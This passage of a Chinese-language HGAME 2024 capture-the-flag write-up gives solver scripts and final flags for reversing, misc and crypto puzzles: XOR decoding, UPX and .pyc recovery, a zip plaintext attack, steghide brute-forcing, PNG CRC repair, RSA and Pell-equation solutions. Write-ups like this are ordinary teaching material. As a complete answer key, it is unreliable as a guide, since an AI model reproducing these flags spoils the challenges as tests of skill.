class="number">1</span>, format, <span class="built_in">strlen</span>(format));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read user input</span></span><br><span class="line">    read(<span class="number">0</span>, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check flag</span></span><br><span class="line">    <span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (esi &lt; <span class="number">33</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((flag[esi] ^ <span class="number">0x22</span>) != c[esi]) &#123;</span><br><span class="line">            <span class="comment">// Print failure message</span></span><br><span class="line">            write(<span class="number">1</span>, failure, <span class="built_in">strlen</span>(failure));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// Exit with failure</span></span><br><span class="line">        &#125;</span><br><span class="line">        esi++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print success message</span></span><br><span class="line">    write(<span class="number">1</span>, success, <span class="built_in">strlen</span>(success));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Exit with success</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析可以得知，c数组的每一个数字异或上<code>0x22</code>即可得到flag。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x22</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>用工具脱壳，然后拖到ida分析。</p><p><img src="/./hgame2024_week1/r_3_1.png"></p><p>把<code>word_1400022A0</code>的值异或上<code>0x32</code>即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">0x64</span>,<span class="number">0x7B</span>,<span class="number">0x76</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x49</span>,<span class="number">0x65</span>,<span class="number">0x5D</span>,<span class="number">0x45</span>,<span class="number">0x13</span>,<span class="number">0x6B</span>,<span class="number">2</span>,<span class="number">0x47</span>,<span class="number">0x6D</span>,<span class="number">0x59</span>,<span class="number">0x5C</span>,<span class="number">0x2</span>,<span class="number">0x45</span>,<span class="number">0x6D</span>, <span class="number">6</span>,<span class="number">0x6D</span>,<span class="number">0x5E</span>, <span class="number">3</span>,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x5E</span>,<span class="number">0x1</span>,<span class="number">0x6D</span>,<span class="number">0x2</span>,<span class="number">0x54</span>,<span class="number">0x6D</span>,<span class="number">0x67</span>,<span class="number">0x62</span>,<span class="number">0x6A</span>,<span class="number">0x13</span>,<span class="number">0x4F</span>,<span class="number">0x32</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># VIDAR&#123;Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>用 <a href="https://sourceforge.net/projects/pyinstallerextractor/">pyinstxtractor.py</a> 反编译exe</p><p><img src="/./hgame2024_week1/r_4_1.png"></p><p>这里可以看到python版本是<code>311</code>。</p><p>进入反编译后的文件夹，用010修补<code>ezPYC</code>的文件头。</p><p>不同的 Python 版本会有不同的 <code>PyObject_HEAD</code>，以下是各版本的文件头：</p><table><thead><tr><th>Python 版本</th><th>十六进制文件头</th></tr></thead><tbody><tr><td>Python 2.7</td><td><code>03f30d0a00000000</code></td></tr><tr><td>Python 3.0</td><td><code>3b0c0d0a00000000</code></td></tr><tr><td>Python 3.1</td><td><code>4f0c0d0a00000000</code></td></tr><tr><td>Python 3.2</td><td><code>6c0c0d0a00000000</code></td></tr><tr><td>Python 3.3</td><td><code>9e0c0d0a0000000000000000</code></td></tr><tr><td>Python 3.4</td><td><code>ee0c0d0a0000000000000000</code></td></tr><tr><td>Python 3.5</td><td><code>170d0d0a0000000000000000</code></td></tr><tr><td>Python 3.6</td><td><code>330d0d0a0000000000000000</code></td></tr><tr><td>Python 3.7</td><td><code>420d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.8</td><td><code>55 0d 0d 0a 00 00 00 00 00 00 00 00 00 00 00 00</code></td></tr><tr><td>Python 3.9</td><td><code>610d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.10</td><td><code>6f0d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.11</td><td><code>a70d0d0a000000000000000000000000</code></td></tr></tbody></table><p>用 <code>pycdc.exe</code> 反编译修补后的 <code>ezPYC</code>，可以得到部分源码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: ezPYC.pyc (Python 3.11)</span></span><br><span class="line"></span><br><span class="line">Unsupported opcode: POP_JUMP_FORWARD_IF_FALSE</span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line"><span class="built_in">input</span> = <span class="built_in">input</span>(<span class="string">&#x27;plz input flag:&#x27;</span>)</span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br></pre></td></tr></table></figure><p>这里猜测一下，flag是<code>flag</code>变量异或上<code>c</code>变量的值</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">87</span>,<span class="number">75</span>,<span class="number">71</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">83</span>,<span class="number">125</span>,<span class="number">117</span>,<span class="number">106</span>,<span class="number">108</span>,<span class="number">106</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">48</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">55</span>,<span class="number">94</span>,<span class="number">51</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">119</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">49</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">37</span>,<span class="number">124</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    out = flag[i]^c[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(out),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>关注“凌武科技”微信公众号，发送“HGAME2024”获得 Flag！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;welc0me_t0_HGAME_2024&#125;</span><br></pre></td></tr></table></figure><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>图片放手机上，闭上一只眼睛从侧边看即可。（费眼睛）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</span><br></pre></td></tr></table></figure><h2 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h2><p>附件给了张图片和压缩包，压缩包里有一个和外面名字一样的图片，很明显是明文攻击。</p><p><img src="/./hgame2024_week1/m_2_1.png"></p><p>攻击完成后即可得到未加密的压缩包，解压即可。</p><p>查看<code>photo.txt</code>，里面是base64编码，解码后转成图片即可得到flag。</p><p><img src="/./hgame2024_week1/m_2_2.png"></p><p><img src="/./hgame2024_week1/m_2_3.png"></p><h2 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个即将发售的游戏的主角薇^3带来了一条消息。这段消息隐藏在加密的图片里</span><br><span class="line">但即使解开了图片的六位弱加密,看到的也是一张迷惑的图片。</span><br><span class="line">也许游戏的官网上有这种文字的记录?</span><br><span class="line">补充：flag格式为`hgame\&#123;[a-z0-9_]+\&#125;`</span><br></pre></td></tr></table></figure><p>根据题目说明，可以判断是<code>steghide</code>隐写。</p><p>用<code>stegseek</code>爆破出密钥为<code>123456</code>，得到一个压缩包。</p><p>解压后得到一张图片。</p><p><img src="/./hgame2024_week1/m_3_1.png"></p><p>根据 <a href="https://my1l.github.io/Ctrl/CtrlAstr.html">这个网站</a> 来对照字体，得到flag为 <code>hgame&#123;welc0me!&#125;</code></p><h2 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h2><p>图片宽高有问题，根据crc算出正确的宽和高，然后修复。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破png的crc，找到宽高</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crc32_hex = <span class="number">0x121b804d</span></span><br><span class="line">filename = <span class="string">&#x27;secret.png&#x27;</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32_hex):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;wid:&#x27;</span>, <span class="built_in">hex</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hight:&#x27;</span>, <span class="built_in">hex</span>(j))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1394 1999</span></span><br><span class="line"><span class="string">wid: 0x572</span></span><br><span class="line"><span class="string">hight: 0x7cf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/m_4_1.png"></p><p>用<code>zsteg</code>查看，发现有一个压缩包，还看到了一个<code>KEY</code>。</p><p><img src="/./hgame2024_week1/m_4_2.png"></p><p>将压缩包提取出来并解压，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVOCRJGMKLDJGBQIUIVXHEYLPNWR</span><br></pre></td></tr></table></figure><p>希尔密码解密，用这个 <a href="https://ctf.bugku.com/tool/hill">在线网站</a> 解密即可</p><p><img src="/./hgame2024_week1/m_4_3.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DISAPPEARINTHESEAOFBUTTERFLY</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1=<span class="built_in">pow</span>(p,q,n)</span><br><span class="line">leak2=<span class="built_in">pow</span>(q,p,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak1=<span class="subst">&#123;leak1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak2=<span class="subst">&#123;leak2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line"><span class="string">leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line"><span class="string">c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>由费马小定理，可以知道<code>leak1</code>和<code>leak2</code>分别是<code>q</code>和<code>p</code>，直接代进去算即可。</p><p>更具体的讲解参考这个视频：<a href="https://www.bilibili.com/video/BV1Sh41177Rm/?vd_source=abef91c9524f8373b84bcdb481407372">【CTF-加密】RSA之leak&#x3D;p^q%n+q^p%n</a></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">q=<span class="number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line">p=<span class="number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line">c=<span class="number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ezMath"><a href="#ezMath" class="headerlink" title="ezMath"></a>ezMath</h2><p>佩尔方程求解</p><p>参考这个文章：<a href="https://blog.csdn.net/acdreamers/article/details/8529686">连分数求解Pell方程</a></p><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,y,x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    encrypted =cipher.encrypt(flag)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line">flag=pad(flag)</span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">enc=encrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br></pre></td></tr></table></figure><p>先用java求出 <code>x</code> 和 <code>y</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">    &#123;</span><br><span class="line">        BigInteger N, p1, p2, q1, q2, a0, a1, a2, g1, g2, h1, h2,p,q;</span><br><span class="line">        g1 = q2 = p1 = BigInteger.ZERO;</span><br><span class="line">        h1 = q1 = p2 = BigInteger.ONE;</span><br><span class="line">        a0 = a1 = BigInteger.valueOf((<span class="type">int</span>)Math.sqrt(<span class="number">1.0</span>*n));</span><br><span class="line">        BigInteger ans=a0.multiply(a0);</span><br><span class="line">        <span class="keyword">if</span>(ans.equals(BigInteger.valueOf(n)))</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;No solution!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        N = BigInteger.valueOf(n);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            g2 = a1.multiply(h1).subtract(g1);</span><br><span class="line">            h2 = N.subtract(g2.pow(<span class="number">2</span>)).divide(h1);</span><br><span class="line">            a2 = g2.add(a0).divide(h2);</span><br><span class="line">            p = a1.multiply(p2).add(p1);</span><br><span class="line">            q = a1.multiply(q2).add(q1);</span><br><span class="line">            <span class="keyword">if</span> (p.pow(<span class="number">2</span>).subtract(N.multiply(q.pow(<span class="number">2</span>))).compareTo(BigInteger.ONE) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            g1 = g2;h1 = h2;a1 = a2;</span><br><span class="line">            p1 = p2;p2 = p;</span><br><span class="line">            q1 = q2;q2 = q;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;x = &quot;</span>+p+<span class="string">&quot;\ny = &quot;</span>+q);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cin</span> <span class="operator">=</span> <span class="number">114514</span>;</span><br><span class="line">        solve(cin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x = 3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line"><span class="comment">y = 9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>接着带入python中解aes</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x = <span class="number">3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line">y = <span class="number">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"></span><br><span class="line">enc=<span class="string">b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    decrypted =cipher.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">flag=decrypt(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="奇怪的图片"><a href="#奇怪的图片" class="headerlink" title="奇怪的图片"></a>奇怪的图片</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_image</span>(<span class="params">width, height</span>):</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            red = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            green = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            blue = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            pixels[x, y] = (red, green, blue)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_text</span>(<span class="params">image, width, height, token</span>):</span><br><span class="line">    font_size = random.randint(<span class="number">16</span>, <span class="number">40</span>)</span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, font_size)</span><br><span class="line">    text_color = (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    x = random.randint(<span class="number">0</span>, width - font_size * <span class="built_in">len</span>(token))</span><br><span class="line">    y = random.randint(<span class="number">0</span>, height - font_size)</span><br><span class="line">    draw = ImageDraw.Draw(image)</span><br><span class="line">    draw.text((x, y), token, font=font, fill=text_color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, 